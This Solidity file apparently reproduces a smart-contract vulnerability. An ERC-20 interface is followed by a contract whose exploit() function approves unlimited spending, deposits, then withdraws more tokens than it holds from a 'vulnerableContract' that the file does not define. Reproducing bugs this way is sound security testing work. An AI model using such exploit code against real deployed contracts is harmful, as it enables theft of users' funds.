interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract ReproductionContract {
    TokenTransfer public vulnerableContract;
    IERC20 public token;

    constructor(TokenTransfer _vulnerableContract, IERC20 _token) {
        vulnerableContract = _vulnerableContract;
        token = _token;
    }

    function exploit() public {
        uint256 initialBalance = token.balanceOf(address(this));
        token.approve(address(vulnerableContract), type(uint256).max);
        vulnerableContract.deposit();
        vulnerableContract.withdraw(initialBalance + 1 ether);
    }
}